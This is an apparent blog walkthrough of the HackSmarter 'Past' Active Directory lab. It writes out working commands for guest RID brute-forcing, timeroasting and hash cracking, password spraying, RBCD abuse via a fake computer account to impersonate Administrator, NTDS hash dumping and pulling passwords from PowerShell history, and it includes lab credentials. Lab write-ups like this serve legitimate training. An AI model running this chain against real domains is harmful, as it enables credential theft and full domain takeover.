---
title: "HackSmarter Past Walkthrough  "
date: 2026-06-25 14:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---


## Objective/Scope : 

You have been hired by Hack Smarter to perform a Penetration Test on Past Systems Inc. During your call with the client, they stated they are currently adding new machines to the network.

Initial Access

The client has provided you with VPN access to their internal network, but no credentials.



## Solution : 

First we start by scanning the target : 

<img width="993" height="789" alt="image" src="https://github.com/user-attachments/assets/b9fd59c4-d493-4819-ac52-f85a8e6800e5" />

Just by looking at the initial scan we can confirm this is a Domain Controller (Kerberos,Ldap,DNS) , since this is an AD machine , i always like to keep this quick checklist in mind : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Now before we start we first add the hostname and domain name to our /etc/hosts file , we can use nxc for this : 

<img width="1886" height="568" alt="image" src="https://github.com/user-attachments/assets/caa0140c-a7ff-48dc-a7ac-f977db5d8e06" />

First let's try to generate a List of users that we can use for ASREPROASING , we can use nxc for this with anonymous access to both smb and ldap . 

<img width="1241" height="821" alt="image" src="https://github.com/user-attachments/assets/8b090ddf-fb37-433b-8eee-39a425990275" />

Anonymous login didn't return anything useful , let's check shares : 

<img width="1692" height="632" alt="image" src="https://github.com/user-attachments/assets/323c6bc2-bbde-4251-97ad-08411fffab6a" />

We find that we have READ access to a Share , looking at it , we find a list of AD machines : 

<img width="735" height="289" alt="image" src="https://github.com/user-attachments/assets/7d870f1d-df63-4661-9df8-0cdb28cfff65" />

We will keep this information for later . 

I completely forgot to check for users using the guest account , since we can access the shares as Guest , we should be able to retrieve a list of usernames since i assume it will be misconfigured as well . 

<img width="1092" height="833" alt="image" src="https://github.com/user-attachments/assets/d992fd43-1435-4517-baab-33c1418cb862" />

```bash
nxc smb $target -u 'guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt 
```

We are able to get a list of users , perfect . Let's test for ASREPROASTING : 

<img width="1171" height="359" alt="image" src="https://github.com/user-attachments/assets/600f2b7e-ae23-461a-a5cc-f3ed8a34c819" />

Unfortunately , this didn't return anything useful . 

For this one i checked for Hints , and i got something called TimeRoasting that only requires us to have the RID range of machine accounts on the domain . 

Machine accounts need to stay time-synced with the DC (relevant for things like Kerberos). Microsoft's NTP authentication extension (MS-SNTP) secures these time responses using the machine account's password hash as the key. Since this NTP exchange requires no authentication to initiate, an attacker can send NTP requests for a range of RIDs and receive back authenticated responses each one effectively a crackable hash tied to that account's password. No domain credentials needed at all.

Now looking online for ways to perform TimeRoasting , i found that NXC also can be used for this using the mode TimeRoast :

```bash
nxc smb $target -u 'guest' -p '' -M timeroast
```

<img width="1907" height="427" alt="image" src="https://github.com/user-attachments/assets/0ef95f93-66e5-46e6-a0b9-139b97fd0e97" />

Now to crack these hashes we can use Hashcat the mode is 31300 :

<img width="1058" height="743" alt="image" src="https://github.com/user-attachments/assets/b9d32ef1-553d-4712-8238-d47d1bc02cbc" />

Now using Hashcat : 

<img width="1566" height="761" alt="image" src="https://github.com/user-attachments/assets/1105f3d9-7202-4263-8af7-007eaa4e7689" />

Eventually we are able to crack 1 hash , our newly found password : 'P@ssw0rd!'

<img width="1676" height="816" alt="image" src="https://github.com/user-attachments/assets/b04b9e5f-9310-4f68-97d9-7ee2bd7576af" />

Let's first spray it across the machine accounts , then the users we generated earlier : 

<img width="1881" height="369" alt="image" src="https://github.com/user-attachments/assets/7c6700e4-0b09-4347-8f8c-78879e104e65" />

We're able to get the Hash for the machine account : APPDEV01$ , we see that the user tyler has some account restrictions . 

Now using the machine account let's use Bloodhound to get a better view about the domain : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

<img width="1632" height="285" alt="image" src="https://github.com/user-attachments/assets/ad612d0c-3c27-4b87-9c65-56472fa87e4a" />

Now if we check Bloodhound : 

<img width="1595" height="539" alt="image" src="https://github.com/user-attachments/assets/3fe88e8b-aa70-44c4-ad51-b93584305608" />

Nothing useful for us , if we check the Tyler user we found earlier : 

<img width="1493" height="557" alt="image" src="https://github.com/user-attachments/assets/5314f5b3-732b-40dd-bdf4-40ed63066193" />

He has Generic All over the EC2AMAZ-A5O4OL8 which is part of the Domain Controller Group : 

<img width="1615" height="638" alt="image" src="https://github.com/user-attachments/assets/d6a3b560-67f7-4f97-8579-6a12bb55bbec" />

Now if we can just get access to Tyler , we can compromise the entire thing .

Remember the user Tyler had : STATUS_ACCOUNT_RESTRICTION , Looked it up online , this means our user isn't allowed to login due to policy restriction . 

Back to our Machine account , i found that another way to get around this Restriction is to use Kerberos instead of SMB , we can first setup the Kerberos conf using nxc : 

```bash
nxc smb $target --generate-krb5-file past.krb
export KRB5_CONFIG=kerb_conf
```

<img width="1556" height="710" alt="image" src="https://github.com/user-attachments/assets/b69937ad-1da6-4268-9450-8d8204add633" />

Now to test this : 

```bash
nxc smb $target -u 'APPDEV01$'  -p 'P@ssw0rd!' -k
impacket-getTGT past.local/'APPDEV01$':'P@ssw0rd!' -dc-ip $target
export KRB5CCNAME=APPDEV01$.ccache
nxc smb $target -u 'APPDEV01$'  -k --use-kcache
```

<img width="1491" height="663" alt="image" src="https://github.com/user-attachments/assets/fc7d8434-9956-4220-833f-4971209ae032" />

Perfect Kerbros is working perfectly . 

Now let's check the shares using the APPDEV01 machine acc . 

<img width="1347" height="461" alt="image" src="https://github.com/user-attachments/assets/374bfc3c-e7c8-4233-bb0a-e67deb681575" />

Perfect , we have some new shares we can read , let's use nxc to spider the shares : 

```bash
 nxc smb $target -u 'APPDEV01$'  -k --use-kcache --shares -M spider_plus
```

<img width="1702" height="682" alt="image" src="https://github.com/user-attachments/assets/89a2be05-9acf-450e-9577-fcaafbfaff52" />

If we check the Json file we find this interesting file : 

<img width="1234" height="676" alt="image" src="https://github.com/user-attachments/assets/402bdf1e-a74f-428c-8d9e-663ee5775a15" />

Maybe this file holds some creds since it's used to automate tyler's stuff . Let's check the Sysvol share . 

<img width="1405" height="806" alt="image" src="https://github.com/user-attachments/assets/90814a7b-c877-412e-9fea-9ca6c04e7e33" />

Just like that we got Tyler's creds . 

<img width="1226" height="464" alt="image" src="https://github.com/user-attachments/assets/7275471b-1c71-4751-850c-13ffa337916d" />

Let's try logging in using Kerberos , first let's ask for out TGT using impacket.getTGT :

```bash
impacket-getTGT past.local/'tyler':'5rtfgvb%RTFGVB' -dc-ip $target
export KRB5CCNAME=tyler.ccache
nxc smb $target -u 'tyler'  -k --use-kcache
```

<img width="1565" height="616" alt="image" src="https://github.com/user-attachments/assets/f3eb1a2f-6bf2-4d54-87d8-bdd2a702b1ea" />

Perfect , now back to Bloodhound , we saw that we got GenericALL over the machine .

<img width="1668" height="719" alt="image" src="https://github.com/user-attachments/assets/8334865f-5254-4d81-87b1-51be58d68140" />

One way to abuse this is via RBCD , i will be following this guide from AlteredSecurity on how to perform it : 

```bash
https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd
```

Here are the steps to perform RCBD : 

```bash
# 1. Generate krb5.conf for the domain (nxc helper)
nxc smb $target --generate-krb5-file kerb_conf
export KRB5_CONFIG=kerb_conf

# 2. Get a TGT for the initial low-priv user (tyler)
impacket-getTGT past.local/'tyler':'5rtfgvb%RTFGVB' -dc-ip $target
export KRB5CCNAME=tyler.ccache

# 3. Add a new computer account (FAKE$) using tyler's machine account quota rights
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'WEAK.123' \
  -dc-host EC2AMAZ-A5O4OL8.past.local -k -no-pass 'past.local/tyler'

# 4. Write Resource-Based Constrained Delegation: let FAKE$ delegate to the DC/target machine
rbcd.py past.local/tyler -k -no-pass \
  -delegate-to 'EC2AMAZ-A5O4OL8$' -delegate-from 'FAKE$' -action write

# (optional) confirm it landed
rbcd.py past.local/tyler -k -no-pass -delegate-to 'EC2AMAZ-A5O4OL8$' -action read

# 5. Get a TGT for the new FAKE$ machine account
impacket-getTGT past.local/'FAKE$':'WEAK.123' -dc-ip $target
export KRB5CCNAME=FAKE\$.ccache

# 6. S4U2Self + S4U2Proxy: impersonate Administrator via FAKE$'s delegation rights
impacket-getST -spn cifs/EC2AMAZ-A5O4OL8.past.local -impersonate administrator \
  -k -no-pass -dc-ip $target past.local/'FAKE$'

# 7. Use the impersonated Administrator ticket
export KRB5CCNAME=administrator@cifs_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache
nxc smb $target -u administrator -k --use-kcache --ntds
```

Now first we request our TGT as Tyler then add the computer account : 

<img width="1218" height="609" alt="image" src="https://github.com/user-attachments/assets/c70e0987-d704-4ace-98ea-d04f12e16797" />

Now we abuse RBCD to allow our fake machine account to delegate to the DC machine .

<img width="1123" height="489" alt="image" src="https://github.com/user-attachments/assets/4e691314-3b27-491e-a2e9-de0181fb0d8c" />

Perfect now our Fake machine account can act on behalf of the DC machine . 

Now to confirm : 

<img width="1053" height="322" alt="image" src="https://github.com/user-attachments/assets/69295140-ffb5-4fb2-a288-2f0afaf777d3" />

Now we get a TGT as the fake machine account . 

<img width="915" height="331" alt="image" src="https://github.com/user-attachments/assets/3364064b-beb3-4f80-aa7e-0683e6fe2ccf" />

Now we can use our rights to impersonate the administrator on the DC machine : 

<img width="1120" height="608" alt="image" src="https://github.com/user-attachments/assets/27fb285b-2df1-49fd-bd7d-681f042059cd" />

Finally we can use his ticket to dump the NTDS :)

<img width="1598" height="553" alt="image" src="https://github.com/user-attachments/assets/f0cc5830-ef4f-43b0-bbd7-62a309b7740a" />

Finally we can use the admin hash to login via winrm : 

The root flag is always in the administrator desktop : 

<img width="1523" height="704" alt="image" src="https://github.com/user-attachments/assets/ba2e6e61-d8f6-4d82-804a-13a29f9bfce0" />

And for the Ryan password , we can find it in the PS history : it is usually located at : 

```ps
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
```

<img width="1488" height="604" alt="image" src="https://github.com/user-attachments/assets/c41423fe-19c3-4330-9664-69d32ed47193" />

That was all for this Lab , See you in the next one :) 


